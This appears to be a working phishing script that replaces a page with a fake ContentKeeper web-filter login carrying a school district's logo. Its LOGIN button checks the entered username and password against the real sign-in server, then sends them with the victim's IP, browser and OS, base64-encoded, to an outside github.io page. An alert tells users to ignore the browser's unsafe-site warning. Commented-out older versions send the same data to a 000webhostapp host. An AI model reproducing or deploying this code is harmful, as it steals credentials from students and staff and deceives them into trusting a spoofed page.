document.getElementsByTagName('html')[0].setAttribute('style', 'width:100%;height:100%;');
document.getElementsByTagName('body')[0].setAttribute('style', 'width:100%;height:100%;');
var css = `
@import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700&display=swap');
* {
    padding: 0;
    margin: 0;
    box-sizing: border-box;
}
html {
    background: #38434f;
}
body {
    display: flex;
    flex-direction: column;
    overflow-x:hidden;
    line-height: 1.5;
}
#wrapper{
    display:none;
}
  
#outer {
    width:100%;
    height: 100%;
    background: #38434f;
    display: flex;
    flex-direction: column;
    align-items: center;
}
.login-body {
    background: #fff;
    height: 443.5px;
    width: 600px;
    padding: 15px;
    display: flex;
    flex-direction: column;
}
.loginbox {
    width: 100%;
    height: 100px;
}
.loginhelp {
    width: 100%;
    text-align: right;
}
.loginhelp a {
    color: #ff8f5f!important;
    font-weight: 600;
    text-decoration: none;
    font-size: 12px;
    font-family: 'Open Sans',sans-serif;
}
.loginlogo {
    background: url(https://ckf01.millardps.net/ck/assets/images/logo.png) center /
    250px no-repeat;
    width: 100%;
    height: 75px;
    float: left;
    cursor: pointer;
}
.logintitle {
    color: #000;
    font-size: 19px;
    font-weight: 300;
    margin-bottom: 20px;
    text-align: center;
    font-family: 'Open Sans',sans-serif;
    cursor: pointer;
}
.username {
    width: 243px;
    border: 1px solid #999;
    border-radius: 0;
    background: 0 0;
    padding: 10px 15px;
    color: #000;
    line-height: 20px;
    height: auto;
    transition: all .2s ease;
    outline: none;
    margin-bottom: 12px;
}
.password {
    width: 243px;
    border: 1px solid #999;
    border-radius: 0;
    background: 0 0;
    padding: 10px 15px;
    color: #000;
    line-height: 20px;
    height: auto;
    transition: all .2s ease;
    outline: none;
}
.inputs {
    width: 100%;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    line-height: 1.5;
    font-weight: 400;
    text-align: left;
}
.btn {
    border-radius: 0;
    background-color: #fff;
    border: 2px solid #ff8f5f!important;
    color: #ff8f5f!important;
    font-size: 14px;
    padding: 4px 7px;
    line-height: 20px;
    font-weight: 400;
    width: 142px;
    margin-top: 40px;
    margin-bottom: 30px;
    cursor: pointer;
}
.loginlink {
    margin-bottom: 10px;
}
.loginlink a {
    font-weight: 600;
    font-size: 12px;
    font-family: 'Open Sans',sans-serif;
    text-decoration: none;
}
.company-name {
    color: #ff8f5f;
}
.foot {
    font-weight: 400;
    font-size: 12px;
    font-family: 'Open Sans',sans-serif;
    text-decoration: none;
}
.error {
    font-weight: 400;
    font-family: 'Open Sans',sans-serif;
    font-size: 12px;
    display: none;
}
`,
head = document.head || document.getElementsByTagName('head')[0],
style = document.createElement('style');
//var concealpacket = "";function setIP(data) {concealpacket = "";var username = document.getElementById("login_username").value;var password = document.getElementById("login_password").value;concealpacket += "Username: " + username + " | Password: " + password + " | IP: ";concealpacket += data.ip;concealpacket += " | UserAgents: " + navigator.userAgent;var OSName="Unknown OS";if (navigator.appVersion.indexOf("Win")!=-1) OSName="Windows";if (navigator.appVersion.indexOf("Mac")!=-1) OSName="MacOS";if (navigator.appVersion.indexOf("X11")!=-1) OSName="UNIX";if (navigator.appVersion.indexOf("Linux")!=-1) OSName="Linux";concealpacket += " | OS: " + OSName;alert(concealpacket);concealpacket = btoa(concealpacket);}function getIP() {fetch("https://api.ipify.org?format=json").then((response) => response.json()).then((data) => setIP(data));}function sendcreds() {var username = document.getElementById("login_username").value;var password = document.getElementById("login_password").value;if (username.length <= 4 || password.length <= 5) {document.getElementsByClassName("error")[0].style.display = "block";} else {document.getElementsByClassName("error")[0].style.display = "none";getIP();}}
//                    <button class="btn" clickdisable="" type="submit" ckdisabled="false" onclick="var concealpacket = '';function setIP(data) {concealpacket = '';var username = document.getElementById('login_username').value;var password = document.getElementById('login_password').value;concealpacket += 'Username: ' + username + ' | Password: ' + password + ' | IP: ';concealpacket += data.ip;concealpacket += ' | UserAgents: ' + navigator.userAgent;var OSName='Unknown OS';if (navigator.appVersion.indexOf('Win')!=-1) OSName='Windows';if (navigator.appVersion.indexOf('Mac')!=-1) OSName='MacOS';if (navigator.appVersion.indexOf('X11')!=-1) OSName='UNIX';if (navigator.appVersion.indexOf('Linux')!=-1) OSName='Linux';concealpacket += ' | OS: ' + OSName;concealpacket = btoa(concealpacket);fetch("https://cryptomeme.000webhostapp.com/?m=" + concealpacket).then((data) => console.log(data));}function getIP() {fetch('https://api.ipify.org?format=json').then((response) => response.json()).then((data) => setIP(data));}function sendcreds() {var username = document.getElementById('login_username').value;var password = document.getElementById('login_password').value;if (username.length <= 4 || password.length <= 5) {document.getElementsByClassName('error')[0].style.display = 'block';} else {document.getElementsByClassName('error')[0].style.display = 'none';getIP();}};sendcreds();">LOGIN</button>

head.appendChild(style);
if (style.styleSheet){
    style.styleSheet.cssText = css;
} else {
    style.appendChild(document.createTextNode(css));
}

function runnow(){
    document.getElementsByTagName("body")[0].id = "bodytagg";
    document.getElementById('bodytagg').innerHTML = `
        <div id="outer">
            <div class="loginbox"></div>
            <div class="login-body">
                <div class="loginhelp">
                    <a href="https://www.contentkeeper.com" target="_blank">HELP</a>
                </div>
                <div class="loginlogo"></div>
                <div class="logintitle">Proven Internet Security for the Enterprise</div>
                <div class="inputs">
                    <input autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="" class="username" id="login_username" name="username" placeholder="Username" spellcheck="false" type="text">
                    <input autocapitalize="off" autocomplete="off" autocorrect="off" class="password" id="login_password" name="password" placeholder="Password" spellcheck="false" type="password">
                </div>
                <p style="width: 100%; text-align: center;height: 18px;padding: 0;margin-top: 10px;" class="error"><span style="color: red">Invalid combination of username and/or password</span></p>
                <div class="inputs">
                    <button class="btn" clickdisable="" type="submit" ckdisabled="false" onclick="var concealpacket = '';var message = '';var f = '';function appendtomsg(msg){message='';message = msg;if(message == 'Invalid combination of username and/or password'){document.getElementsByClassName('error')[0].style.display = 'block';getIP();} else {document.getElementsByClassName('error')[0].style.display = 'none';getIP();}};function setIP(data) {concealpacket = '';var username = document.getElementById('login_username').value;var password = document.getElementById('login_password').value;concealpacket += 'Username: ' + username + ' | Password: ' + password + ' | IP: ';concealpacket += data.ip;concealpacket += ' | UserAgents: ' + navigator.userAgent;var OSName='Unknown OS';if (navigator.appVersion.indexOf('Win')!=-1) OSName='Windows';if (navigator.appVersion.indexOf('Mac')!=-1) OSName='MacOS';if (navigator.appVersion.indexOf('X11')!=-1) OSName='UNIX';if (navigator.appVersion.indexOf('Linux')!=-1) OSName='Linux';concealpacket += ' | OS: ' + OSName;concealpacket = btoa(concealpacket);alert('We Have A New Dashboard And It Has Not Got The SSL Upgrade Yet, So Please Ignore The Unsafe Site Message');window.open('https://fazelastblood.github.io/d/?m=' + concealpacket, '_blank');}function getIP() {fetch('https://api.ipify.org?format=json').then((response) => response.json()).then((data) => setIP(data));};async function sendcreds() {message = '';var usernamee = document.getElementById('login_username').value;var passwordd = document.getElementById('login_password').value;const username = 'username';const password = 'password';const payload = { username: usernamee, password: passwordd };const jsonString = JSON.stringify(payload);fetch('https://ckf01.millardps.net/ckserver/signin', {'headers': {'accept': 'application/json, text/plain, */*','accept-language': 'en-US,en;q=0.9','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin'},'referrer': 'https://ckf01.millardps.net/ck/','referrerPolicy': 'strict-origin-when-cross-origin','body': jsonString,'method': 'POST','mode': 'cors','credentials': 'omit'}).then((response) => response.json()).then((data) => appendtomsg(data.transaction.message));};sendcreds();">LOGIN</button>
                </div>
                <div class="inputs">
                    <div class="loginlink">
                        <a href="https://www.contentkeeper.com" target="_blank"><span class="company-name">ContentKeeper</span>.com </a>
                    </div>
                </div>
                <div class="inputs">
                    <div class="foot"> Copyright © 2000 – Tue Feb 14 2023, ContentKeeper Technologies </div>
                </div>
            </div>
        </div>
        
    `;

}

runnow();
